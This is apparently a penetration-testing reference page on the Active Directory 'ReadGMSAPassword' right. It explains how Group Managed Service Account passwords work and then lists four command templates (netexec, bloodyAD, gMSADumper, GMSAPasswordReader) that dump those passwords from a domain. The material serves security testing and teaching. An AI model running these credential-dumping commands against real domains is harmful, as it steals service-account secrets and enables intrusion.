# ReadGMSAPassword

Microsoft developed `Group Managed Service Accounts (gMSA)` to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the “**Password never expire**” setting enabled, gMSAs offer a more secure and manageable solution:

* **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft’s Key Distribution Service (KDC), eliminating the need for manual password updates.
* **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
* **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
* **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
* **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer’s sAMaccount details or DNS name, simplifying SPN management.

The passwords for gMSAs are stored in the LDAP property `msDS-ManagedPassword` and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with ‘Sealing & Secure’.

{% tabs %}
{% tab title="Netexec" %}
```shellscript
nxc ldap <IP> -u '<USER>' -p '<PASS>' -k --gmsa
```
{% endtab %}

{% tab title="BloodyAD" %}
```shellscript
bloodyAD -u '<USER>' -d <DOMAIN> -p <PASSWORD> --host <IP> get object '<GMSA_ACCOUNT>' --attr msDS-ManagedPassword
```
{% endtab %}

{% tab title="gMSADumper" %}
```shellscript
python3 gMSADumper.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>'
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
GMSAPasswordReader.exe --AccountName <ACCOUNT>
```
{% endtab %}
{% endtabs %}
